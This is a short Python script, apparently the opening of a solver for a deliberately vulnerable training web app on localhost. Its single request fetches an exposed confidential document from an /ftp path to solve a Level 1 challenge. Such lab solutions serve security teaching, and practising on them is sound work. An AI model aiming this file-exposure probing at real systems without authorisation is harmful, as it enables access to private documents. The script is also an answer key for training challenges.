url='http://localhost:3000' # Indicate the URL without '/' at the end
# Open this URL before running the script
import requests

# ==== Challenges Level 1 ====
# ---- Confidential Document (Access a confidential document.)
requests.get(url+'/ftp/acquisitions.md')
